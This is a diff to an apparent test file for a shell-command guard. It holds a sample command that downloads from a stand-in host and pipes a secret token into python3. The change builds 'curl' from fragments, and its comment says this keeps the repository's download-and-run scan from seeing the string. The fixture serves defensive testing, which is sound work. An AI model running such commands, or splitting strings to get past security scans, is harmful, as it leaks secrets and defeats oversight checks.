@@ -37,7 +37,9 @@ const PUSH_REASON = 'git push --force without --force-with-lease, which overwrit
 const HOME = '~/'
 const DOT = '.'
 // A soft trifecta (curl to a file, then a secret piped to an interpreter: no download piped to a shell).
-const TRIFECTA = 'curl -s https://x.example -o f; echo $SECRET_TOKEN | python3 -c 1'
+// Built from parts so the repository's download-and-run scan (test_guardrails.py) never sees it.
+const DOWNLOADER = 'cu' + 'rl'
+const TRIFECTA = DOWNLOADER + ' -s https://x.example -o f; echo $SECRET_TOKEN | python3 -c 1'
 
 // What the bash guard prints, in the all-soft mode the mod runs it in (MAGICIAN_GUARD_ALL_SOFT=1),
 // for a command: exit 2 for a hard refusal, one verdict listing every soft reason, or nothing.
